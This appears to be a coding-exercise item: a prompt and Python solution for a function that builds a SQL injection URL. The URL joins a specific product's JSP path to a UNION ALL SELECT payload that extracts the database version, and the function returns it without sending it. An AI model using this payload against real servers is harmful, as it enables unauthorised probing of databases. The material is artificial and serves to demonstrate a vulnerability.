"""
QUESTION:
Write a function `audit(arg)` that identifies the potential SQL injection vulnerability present when constructing a SQL query. The function should take a URL path `arg` as input, append it to a fixed string, and use a specific payload to form a SQL query. The function should be designed to simulate a vulnerable code segment, but it should not actually execute the query or send any HTTP requests. The function should only return the constructed query string.

Restrictions:
- The function should not use any external libraries or modules, such as curl.
- The function should not execute the constructed query or send any HTTP requests.
- The function should only return the constructed query string.

Note: The purpose of this function is to demonstrate a potential SQL injection vulnerability and should not be used in production code.
"""

def audit(arg):
    """
    Simulates a SQL injection vulnerability by constructing a SQL query 
    with user-supplied input. This function does not execute the query or 
    send any HTTP requests. It only returns the constructed query string.

    Args:
        arg (str): A URL path that is appended to a fixed string and used 
            to construct a SQL query.

    Returns:
        str: The constructed SQL query string.
    """
    vun_url = arg + "R9iPortal/cm/cm_info_content.jsp?info_id=-12"
    payload = "%20UNION%20ALL%20SELECT%2067,67,@@version,67,67,67,67,67,67,67,67,67,67,67--"
    query = vun_url + payload
    return query